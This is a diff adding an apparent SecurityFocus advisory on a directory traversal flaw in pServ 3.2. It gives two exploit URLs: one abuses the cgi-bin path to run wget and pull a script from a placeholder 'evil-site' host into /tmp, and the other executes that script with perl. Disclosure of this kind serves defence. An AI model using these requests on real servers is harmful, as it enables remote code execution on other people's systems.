@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/13642/info
+
+pServ is prone to a directory traversal vulnerability. This occurs because the application does not implement a proper method for filtering directory traversal sequences from URIs. Since this can be done from the cgi-bin directory, it is possible to execute commands to which the Web server has permission.
+
+This issue was reported to affect pServ version 3.2; earlier versions are like vulnerable. 
+
+The following url downloads a script (or executable) to the server:
+http://www.example.com:2000/cgi-bin///////////../../../../../../../../usr/bin/wget?-q+http://evil-site/evil.pl/+-O+/tmp/evil.pl
+
+This is how the script can be executed afterwards:
+http://www.example.com:2000/cgi-bin///////////../../../../../../../../usr/bin/perl?/tmp/evil.pl 
